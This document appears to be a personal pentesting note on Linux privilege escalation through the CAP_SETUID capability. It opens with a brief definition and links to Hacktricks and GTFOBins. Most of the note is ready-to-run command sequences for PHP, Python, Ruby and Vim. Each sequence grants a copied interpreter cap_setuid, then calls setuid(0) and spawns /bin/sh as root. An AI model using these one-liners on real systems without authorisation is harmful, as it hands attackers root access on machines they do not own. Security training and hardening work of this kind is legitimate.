---
id: Capabilities
aliases: []
tags:
  - Linux/Privesc/Capabilities
---

# Capabilities

Linux [Capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)
Linux capabilities divide root privileges into smaller, distinct units,
allowing processes to have a subset of privileges.
This minimizes the risks by not granting full root privileges unnecessarily.

<!-- Resources {{{-->
> [!info]- Resources
>
> - [Hacktricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html)
> - [GTFOBins](https://gtfobins.github.io/#+capabilities)
<!-- }}} -->

___

<!-- CAP_SETUID {{{-->
## CAP_SETUID

[CAP_SETUID](https://man7.org/linux/man-pages/man7/capabilities.7.html)
allows to set effective `UID` of the created process

<!-- PHP {{{-->
### PHP

<!-- Example {{{-->
> [!example]-
>
> Launch a local copy that modifies the process user identifier (`UID`)
>
> ```sh
> cp $(which php) .
> ```
>
> ```sh
> sudo setcap cap_setuid+ep php
> ```
>
> ```sh
> CMD="/bin/sh"
> ```
>
> ```sh
> ./php -r "posix_setuid(0); system('$CMD');"
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Python {{{-->
### Python

<!-- Example {{{-->
> [!example]-
>
> Launch a local copy that modifies the process user identifier (`UID`)
>
> ```sh
> cp $(which python) .
> ```
>
> ```sh
> sudo setcap cap_setuid+ep python
> ```
>
> ```sh
> ./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
> ```
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> Create a script that modifies the process user identifier (`UID`)
>
> ```sh
> touch privesc.py
> ```
>
> ```sh
> echo 'import os; os.setuid(0); os.system("/bin/sh")' > privesc.py
> ```
>
> ```sh
> chmod +x privesc.py
> ```
>
> ```sh
> ./privesc.py
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Ruby {{{-->
### Ruby

<!-- Example {{{-->
> [!example]-
>
> Launch a local copy that modifies the process user identifier (`UID`)
>
> ```sh
> cp $(which ruby) .
> ```
>
> ```sh
> sudo setcap cap_setuid+ep ruby
> ```
>
> ```sh
> ./ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Vim {{{-->
### Vim

<!-- Example {{{-->
> [!example]-
>
> Launch a local copy that modifies the process user identifier (`UID`)
>
> ```sh
> cp $(which vim) .
> ```
>
> ```sh
> sudo setcap cap_setuid+ep vim
> ```
>
> This requires that vim is compiled with Python support.
> Prepend `:py3` for Python 3.
>
> ```sh
> ./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
> ```
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->
